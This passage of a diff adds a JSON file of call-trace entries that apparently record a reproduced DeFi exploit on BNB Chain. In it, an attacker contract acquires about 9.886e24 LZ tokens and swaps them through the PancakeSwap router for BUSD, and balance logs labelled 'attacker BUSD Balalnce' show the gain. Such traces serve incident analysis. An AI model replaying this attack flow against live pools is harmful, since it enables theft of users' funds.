+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "75160",
+        "args": "9886999877471233034310454 [9.886e24], 0, thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "61837",
+        "args": "thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 9886999877471233034310454 [9.886e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "553",
+        "args": "BISWAP: [0xDb821BB482cfDae5D3B1A48EeaD8d2F74678D593]",
+        "original_code": null,
+        "description": null,
+        "return_value": "6277808430515283525 [6.277e18]"
+    },
+    {
+        "id": "531",
+        "args": "BISWAP: [0xDb821BB482cfDae5D3B1A48EeaD8d2F74678D593]",
+        "original_code": null,
+        "description": null,
+        "return_value": "50000031684297012739 [5e19]"
+    },
+    {
+        "id": "553",
+        "args": "thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "9886999877471233034310454 [9.886e24]"
+    },
+    {
+        "id": "0",
+        "args": "\"attacker LZ Balalnce\", 9886999 [9.886e6]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "531",
+        "args": "thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "0",
+        "args": "\"attacker BUSD Balalnce\", 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "553",
+        "args": "thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "9886999877471233034310454 [9.886e24]"
+    },
+    {
+        "id": "9611",
+        "args": "9886999877471233034310454 [9.886e24], [0x3B78458981eB7260d1f781cb8be2CaAC7027DbE2, 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56]",
+        "original_code": null,
+        "description": null,
+        "return_value": "[9886999877471233034310454 [9.886e24], 88899893394357481466597 [8.889e22]]"
+    },
+    {
+        "id": "2893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000089ac00763cb6c7034778000000000000000000000000000000000000000000001410f785b9990f4d0d670000000000000000000000000000000000000000000000000000000063fc513e"
+    },
+    {
+        "id": "0",
+        "args": "\"amounts LZ/BUSD\", 9886999 [9.886e6], 88899 [8.889e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "553",
+        "args": "thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "9886999877471233034310454 [9.886e24]"
+    },
+    {
+        "id": "24609",
+        "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E, 9886999877471233034310454 [9.886e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "95932",
+        "args": "9886999877471233034310454 [9.886e24], 88899893394357481466597 [8.889e22], [0x3B78458981eB7260d1f781cb8be2CaAC7027DbE2, 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56], thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1677483156 [1.677e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "[9886999877471233034310454 [9.886e24], 88899893394357481466597 [8.889e22]]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000089ac00763cb6c7034778000000000000000000000000000000000000000000001410f785b9990f4d0d670000000000000000000000000000000000000000000000000000000063fc513e"
+    },
+    {
+        "id": "24283",
+        "args": "thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2d518FdCc1c8E89B1Abc6Ed73B887e12e61F06DE, 9886999877471233034310454 [9.886e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "62367",
+        "args": "0, 88899893394357481466597 [8.889e22], thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "27971",
+        "args": "thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 88899893394357481466597 [8.889e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "553",
+        "args": "0x2d518FdCc1c8E89B1Abc6Ed73B887e12e61F06DE",
+        "original_code": null,
+        "description": null,
+        "return_value": "10537136958885855443917486 [1.053e25]"
+    },
+    {
+        "id": "531",
+        "args": "0x2d518FdCc1c8E89B1Abc6Ed73B887e12e61F06DE",
+        "original_code": null,
+        "description": null,
+        "return_value": "5860420034181084193410 [5.86e21]"
+    },
+    {
+        "id": "531",
+        "args": "thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "88899893394357481466597 [8.889e22]"
+    },
+    {
+        "id": "0",
+        "args": "\"attacker BUSD Balalnce\", 88899 [8.889e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    }
+]
